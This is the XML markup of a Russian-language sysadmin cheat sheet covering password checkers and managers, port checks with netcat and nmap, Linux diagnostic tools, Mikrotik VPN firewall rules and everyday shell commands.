      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">How secure is my password? </text:span><text:span text:style-name="T3">(https://howsecureismypassword.net/) - <text:s/>сервис для проверки надежности ваших паролей. Показывает примерное время взлома вашего пароля (подбора).</text:span></text:p>
      <text:p text:style-name="P1">DeHashed - <text:s/>сервис поиска по базе взломанных и украденных персональных данных. </text:p>
      <text:p text:style-name="P1">Kaspersky Password Checker - <text:s/>весьма неплохой чекер паролей на устойчивость к взлому и наличии в базах. </text:p>
      <text:p text:style-name="P1">Подборка чекеров утечек - всевозможные сервисы для проверки ваших паролей на предмет утечки.</text:p>
      <text:p text:style-name="P1">3. Хранение </text:p>
      <text:p text:style-name="P1">Spectre (https://spectre.app/) - надежный менеджер паролей, не хранящий ваши пароли по факту, а генерирующий их на лету. </text:p>
      <text:p text:style-name="P1">Buttercup - это кроссплатформенный менеджер паролей с открытым исходным кодом, написанный на NodeJS с Typescript.</text:p>
      <text:p text:style-name="P1">Dashlane - менеджер + генератор сложных паролей.</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>KeePassDX - <text:s/>менеджер паролей с открытым исходным кодом. Для пользователей Android.</text:p>
      <text:p text:style-name="P1">KeeWeb - бесплатный кросс-платформенный менеджер паролей, совместимый с KeePass.</text:p>
      <text:p text:style-name="P1">Bitwarden - <text:s/>бесплатный и открытый менеджер паролей. Поддерживает безопасную синхронизацию между всеми устройствами с возможностью хостинга на собственном сервере.</text:p>
      <text:p text:style-name="P7">stash - <text:s/>это консольная программа/зашифрованное текстовое хранилище для пользователей Linux и Mac.</text:p>
      <text:p text:style-name="P1">Проверяем доступность портов с использованием nmap/netcat/telnet/nc</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Доступность</text:span><text:span text:style-name="T2"> tcp-</text:span><text:span text:style-name="T3">порта</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">netcat</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">netcat [options] host port</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">сканер</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">портов</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">netcat -z -v domain.com 1-1000</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">запустить netcat на хосте и слушать на tcp порте 4444:</text:p>
      <text:p text:style-name="P1">netcat -l 4444</text:p>
      <text:p text:style-name="P1">а на другой машине проверить подключение к netcat, запущенному на другом хосте:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">netcat domain.com 4444</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">nc</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">nc -vt &lt;ip&gt; &lt;port&gt;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">telnet</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">telnet &lt;ip&gt; &lt;port&gt;</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">nmap</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">порт</text:span><text:span text:style-name="T2"> 25 tcp: nmap -p25 11.11.11.11</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Доступность</text:span><text:span text:style-name="T2"> udp-</text:span><text:span text:style-name="T3">порта</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">netcat</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">netcat -u host port</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">nc</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">nc -vu &lt;ip&gt; &lt;port&gt;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">nmap</text:p>
      <text:p text:style-name="P7">доступность порта udp 53: nmap -sU -p U:53 11.1.11.12</text:p>
      <text:p text:style-name="P1">Стандартные инструменты для диагностики системы Linux</text:p>
      <text:p text:style-name="P1">Ядро:</text:p>
      <text:p text:style-name="P1">* perf - (в прошлом performance counters for Linux) - доступ к различным внутренним счётчикам ядра; незаменимый инструмент для выполнения профайлинга ядра/операционной системы</text:p>
      <text:p text:style-name="P1">* ftrace - трассировщик вызовов функций внутри ядра Linux</text:p>
      <text:p text:style-name="P1">* stap - скриптовый язык и инструмент для комплексной диагностики ядра и процессов Linux</text:p>
      <text:p text:style-name="P1">* lttng - (Linux Trace Toolkit Next Generation) инструмент для трассировки ядра, программ и библиотек Linux</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>* bcc (BPF) - (сравнительно) новый и очень мощный инструмент для трассировки и манипуляции ядром Linux, основанный на Berkeley Packet Filter, позволяет делать космические вещи</text:p>
      <text:p text:style-name="P1">Ввод/вывод:</text:p>
      <text:p text:style-name="P1">* iostat (sysstat) - статистика ввода/вывода по заданному устройству (количество операций записи/чтения в единицу времени, скорость записи/чтения)</text:p>
      <text:p text:style-name="P1">* pidstat (sysstat) - нагрузка на процессор, память и устройства от конкретного процесса (заданного по имени или номеру)</text:p>
      <text:p text:style-name="P1">* pcstat - использование кэша (какой процент файла попадает в кэш, какой нет)</text:p>
      <text:p text:style-name="P1">* lsof - информация об открытых процессом файлах</text:p>
      <text:p text:style-name="P1">blktrace</text:p>
      <text:p text:style-name="P1">Системные и библиотечные вызовы:</text:p>
      <text:p text:style-name="P1">* strace - информация о системных вызовах, выполняемых процессом, позволяет понять или по крайней мере лучше разобраться, почему процесс висит или потребляет много ресурсов</text:p>
      <text:p text:style-name="P1">* ltrace - трассировка библиотечных вызовов (которые не обязательно являются системными)</text:p>
      <text:p text:style-name="P1">Аппаратные счётчики:</text:p>
      <text:p text:style-name="P1">* tiptop - информация о процессах в реальном времени, похожа на top, но в отличие от него данные преимущественно берутся с аппаратных счётчиков</text:p>
      <text:p text:style-name="P1">* numastat - просмотр информации об использовании памяти процессами/процессорами в системах с NUMA-архитектурой</text:p>
      <text:p text:style-name="P1">Сеть:</text:p>
      <text:p text:style-name="P13">* netstat - классический инструмент для просмотра конфигурации сети (сокетов, интерфейсов и так далее)</text:p>
      <text:p text:style-name="P13">* ss - socket statistics, позволяет получить информацию об открытых сокетах и их состоянии (похожа на netstat, но умеет больше)</text:p>
      <text:p text:style-name="P1">* ethtool - просмотр настроек и состояния ethernet-интерфейса</text:p>
      <text:p text:style-name="P1">* snmpget - получение данных по SNMP</text:p>
      <text:p text:style-name="P1">* lldptool - настройка LLDP и просмотр данных LLDP</text:p>
      <text:p text:style-name="P1">* nicstat - статистика использования сетевой карты (сетевого интерфейса)</text:p>
      <text:p text:style-name="P1">* ip - конфигурация и статистика стека TCP/IP Linux</text:p>
      <text:p text:style-name="P1">* ifstat - статистика использования сетевого интерфейса в реальном времени</text:p>
      <text:p text:style-name="P1">Процессы:</text:p>
      <text:p text:style-name="P1">* top - информация о наиболее активных (наиболее ресурсоёмки) процессах + общая информация о системе</text:p>
      <text:p text:style-name="P1">* vmstat - данные об использовании виртуальной памяти</text:p>
      <text:p text:style-name="P1">* free - информация о свободной памяти, кэше, буферах</text:p>
      <text:p text:style-name="P1">* slabtop - информация о заполнении SLAB-кэша</text:p>
      <text:p text:style-name="P1">Процессор:</text:p>
      <text:p text:style-name="P1">* mpstat (sysstat) - общая информация об использовании процессора (одного или всех процессоров)</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>* turbostat (kernel-tools) - информация о топологии процессора, частоте, питании, температуре</text:p>
      <text:p text:style-name="P1">* rdmsr - (Read from Model Specific Register) чтение из моделезависимых регистров (позволяет оценить использование LLC-кэша и прочее)</text:p>
      <text:p text:style-name="P1">Универсальные:</text:p>
      <text:p text:style-name="P1">* sar - (system activity report) информация о системной активности в реальном времени (диск, память, процессор и так далее)</text:p>
      <text:p text:style-name="P1">* dstat - универсальный инструмент для сбора информации о системе (vmstat, iostat, netstat, ifstat и ещё много других в одном флаконе)</text:p>
      <text:p text:style-name="P1">* dmesg - журнал сообщений ядра с момента загрузки системы</text:p>
      <text:p text:style-name="P1">* /proc - псевдофайловая система, предоставляющая доступ к внутренним данным/счётчикам ядра</text:p>
      <text:p text:style-name="P7">* sysdig - универсальный инструмент для сбора и анализа данных о системе (сотни различных источников скомбинированные вместе)</text:p>
      <text:p text:style-name="P1">Шпаргалка по фаерволу Mikrotik, пропускаем VPN соединения</text:p>
      <text:p text:style-name="P1">1. Разрешить весь VPN-трафик через VPN-соединения:</text:p>
      <text:p text:style-name="P1">Надо учитывать, что некоторые виды подключения, например GRE не являются PPP.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">/ip firewall filter</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">add chain=forward comment="Permit all PPP" in-interface=all-ppp</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">2. </text:span><text:span text:style-name="T3">Разрешить</text:span><text:span text:style-name="T2"> PP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23 protocol=tcp comment="Permit PPTP"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">add action=accept chain=input protocol=gre comment="Permit GRE"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">3. </text:span><text:span text:style-name="T3">Разрешить</text:span><text:span text:style-name="T2"> L2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01 protocol=udp comment="Permit L2TP"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">4. </text:span><text:span text:style-name="T3">Разрешить</text:span><text:span text:style-name="T2"> IPSec-</text:span><text:span text:style-name="T3">подключение</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">/ip firewall filter</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">add chain=input port=500,4500 protocol=udp comment="Permit IPSec ports 500 and 4500"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">add chain=input protocol=ipsec-esp comment="Permit IPSec protocol ipsec-esp"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">5. </text:span><text:span text:style-name="T3">Разрешить</text:span><text:span text:style-name="T2"> OpenVPN-</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1194 protocol=tcp comment="Permit OpenVPN"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">6. </text:span><text:span text:style-name="T3">Разрешить</text:span><text:span text:style-name="T2"> SSTP-</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443 protocol=tcp comment="Permit SSTP"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">7. </text:span><text:span text:style-name="T3">Разрешить</text:span><text:span text:style-name="T2"> GRE-</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protocol=gre comment="Permit GRE"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">8. </text:span><text:span text:style-name="T3">Разрешить</text:span><text:span text:style-name="T2"> IPIP-</text:span><text:span text:style-name="T3">подключение</text:span><text:span text:style-name="T2">: /ip firewall filter</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">add action=accept chain=input protocol=ipip comment="Permit IPIP"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">9. Прохождение IPSec при использовании Fast Track . Fast Track это опция представленная в RouterOS 6.29. С помощью этой опции можно передавать пакеты в обход ядра Linux. За счет этого существенно повышается производительность маршрутизатора.</text:p>
      <text:p text:style-name="P1">Включить Fast Track можно следующим образом:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">/ip firewall filter add chain=forward action=fasttrack-connection connection-state=established,related</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">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text:p>
      <text:p text:style-name="P1">Как результат появляется недостаток: соединения IPsec так же не будут обработаны. Решить эту проблему можно следующим образом.</text:p>
      <text:p text:style-name="P1">Вначале надо пометить соединения IPsec:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">/ip firewall mangle</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">add action=mark-connection chain=forward comment="Mark IPsec" ipsec-policy=out,ipsec new-connection-mark=ipsec</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">add action=mark-connection chain=forward comment="Mark IPsec" ipsec-policy=in,ipsec new-connection-mark=ipsec</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">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1">/ip firewall filter add action=fasttrack-connection chain=forward comment=FastTrack</text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">connection-mark=!ipsec connection-state=established,related</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Топ полезных команд</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Отправить тестовое письмо: </text:span><text:span text:style-name="T2">echo</text:span><text:span text:style-name="T3"> "</text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3">" | </text:span><text:span text:style-name="T2">mail</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> "</text:span><text:span text:style-name="T2">Test</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Subject</text:span><text:span text:style-name="T3">" </text:span><text:span text:style-name="T2">user</text:span><text:span text:style-name="T3">@</text:span><text:span text:style-name="T2">gmail</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Выполнить </text:span><text:span text:style-name="T2">PHP</text:span><text:span text:style-name="T3"> функцию в консоли: </text:span><text:span text:style-name="T2">php</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">r</text:span><text:span text:style-name="T3"> "</text:span><text:span text:style-name="T2">echo</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">phpinfo</text:span><text:span text:style-name="T3">();" | </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">date</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">timezone</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Отключить спящий режим на </text:span><text:span text:style-name="T2">ubuntu</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">server</text:span><text:span text:style-name="T3">: </text:span><text:span text:style-name="T2">sudo</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">systemctl</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">mask</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">sleep</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">target</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">suspend</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">target</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">hibernate</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">target</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">hybrid</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">sleep</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">target</text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T3">Для проверки набора переменных </text:span><text:span text:style-name="T2">BASH</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">ENV</text:span><text:span text:style-name="T3">: $ </text:span><text:span text:style-name="T2">env</text:span><text:span text:style-name="T3"> | </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">BASH</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">ENV</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Замер скорости диска:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">dd if=/dev/zero of=testfile bs=4k count=1310720</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">dd if=testfile of=/dev/null bs=4k count=1310720</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Обновить locate: /usr/libexec/locate.updatedb</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Конвертировать HEIC в JPG: ls *.HEIC -1 | sed -e 's/\.HEIC$//' | xargs -I {} convert {}.HEIC {}.JPG</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Изменить текстовый редактор для конкретного случая: </text:span><text:span text:style-name="T2">export</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">EDITOR</text:span><text:span text:style-name="T3">=</text:span><text:span text:style-name="T2">ee</text:span><text:span text:style-name="T3">; </text:span><text:span text:style-name="T2">crontab</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">e</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Удалить snapd в Ubuntu Server:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ sudo apt purge snapd</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ sudo apt-mark hold snapd</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">snapd помечен как зафиксированный.</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Удалить старые данные </text:span><text:span text:style-name="T2">telegraf</text:span><text:span text:style-name="T3"> в </text:span><text:span text:style-name="T2">Influxdb</text:span><text:span text:style-name="T3"> 1.8:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ docker exec -ti influxdb influx </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Connected to http://localhost:8086 version 1.8.10</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">InfluxDB shell version: 1.8.10</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">&gt; use telegraf;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Using database telegraf</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">&gt; DELETE WHERE time &lt; '2022-06-01'</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">будут удалены все записи до 2022-06-01</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Работа с сетью. Изменением маршрута: </text:span><text:span text:style-name="T2">route</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">change</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">default</text:span><text:span text:style-name="T3"> 192.168.1.1</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Выключаем </text:span><text:span text:style-name="T2">IPv</text:span><text:span text:style-name="T3">6: </text:span><text:span text:style-name="T2">sudo</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">nano</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sysctl</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">conf</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">net.ipv6.conf.all.disable_ipv6 = 1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">net.ipv6.conf.default.disable_ipv6 = 1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">net.ipv6.conf.lo.disable_ipv6 = 1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Информация о пользователях и системе в </text:span><text:span text:style-name="T2">Linux</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">whoami</text:span><text:span text:style-name="T3"> или </text:span><text:span text:style-name="T2">echo</text:span><text:span text:style-name="T3"> $</text:span><text:span text:style-name="T2">USER</text:span><text:span text:style-name="T3">- выведем имя юзера</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">groups</text:span><text:span text:style-name="T3"> - выведет группы пользователя</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">id</text:span><text:span text:style-name="T3"> - выведет </text:span><text:span text:style-name="T2">User</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">IDentifier</text:span><text:span text:style-name="T3">, его имя, </text:span><text:span text:style-name="T2">Group</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">IDentifier</text:span><text:span text:style-name="T3"> и группы данного юзера с их </text:span><text:span text:style-name="T2">GID</text:span></text:p>
      <text:p text:style-name="P1">(Обычно первая сотка/тысяча юзеров зарезервирована для системных)</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">В /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">passwd</text:span><text:span text:style-name="T3"> записываются </text:span><text:span text:style-name="T2">UIDs</text:span><text:span text:style-name="T3"> пользователей</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">В /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">groups</text:span><text:span text:style-name="T3"> записываются </text:span><text:span text:style-name="T2">GIDs</text:span><text:span text:style-name="T3"> пользователей</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">last</text:span><text:span text:style-name="T3"> - список последних логинов в систему</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">last</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">reboot</text:span><text:span text:style-name="T3"> - список перезагрузок хоста по времени</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">last</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">user</text:span><text:span text:style-name="T3">1 - отобразить историю регистрации пользователя в системе и время его нахождения в ней</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">w</text:span><text:span text:style-name="T3"> - показывает активные сессии (дата, время, </text:span><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3">, простой, сколько было потреблено процессорного времени и что выполняет)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo</text:span><text:span text:style-name="T3"> $</text:span><text:span text:style-name="T2">XDG</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">CURRENT</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">DESKTOP</text:span><text:span text:style-name="T3"> - узнать какая графическая оболочка</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">hostname</text:span><text:span text:style-name="T3"> - выведет имя хоста, </text:span><text:span text:style-name="T2">hostname</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">i</text:span><text:span text:style-name="T3"> - </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3"> адреса</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">uname</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> - выводит ОС, версию ядра, архитектуру и дату сборки, процессор, лицензию и так далее, т.е. вся информация о системе, сборке или </text:span><text:soft-page-break/><text:span text:style-name="T2">lsb</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">release</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> или пакет </text:span><text:span text:style-name="T2">neofetch</text:span><text:span text:style-name="T3"> с полной информацией о системе или </text:span><text:span text:style-name="T2">cat</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">os</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">release</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">dmidecode</text:span><text:span text:style-name="T3"> - информация о железе</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">free</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">w</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3"> --</text:span><text:span text:style-name="T2">mega</text:span><text:span text:style-name="T3"> - выводит данные об использовании ОЗУ и </text:span><text:span text:style-name="T2">swap</text:span><text:span text:style-name="T3"> в мегабайтах (поле </text:span><text:span text:style-name="T2">shared</text:span><text:span text:style-name="T3"> значит разделенная между процессами память, кэш это то, что часто используется и хранится, буфер это то, что приготовлено для записи, кэш и буфера это условно свободная память)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">date</text:span><text:span text:style-name="T3"> - полная дата с часовым поясом</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ifconfig</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> - Настройки всех сетевых адаптеров</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">addr</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">show</text:span><text:span text:style-name="T3"> - Список всех сетевых интерфейсов и связанных </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3">-адресов</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">wget</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">qO</text:span><text:span text:style-name="T3">- </text:span><text:span text:style-name="T2">eth</text:span><text:span text:style-name="T3">0.</text:span><text:span text:style-name="T2">me</text:span><text:span text:style-name="T3"> - Узнать внешний </text:span><text:span text:style-name="T2">IP</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">uptime</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">man</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> - документация/инструкция по указанному пакету</text:span></text:p>
      <text:p text:style-name="P1">Работа с архивами:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Создать .</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">gz</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">czvf</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">gz</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">full</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">path</text:span><text:span text:style-name="T3"> - создать .</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">gz</text:span><text:span text:style-name="T3"> (архив)</text:span></text:p>
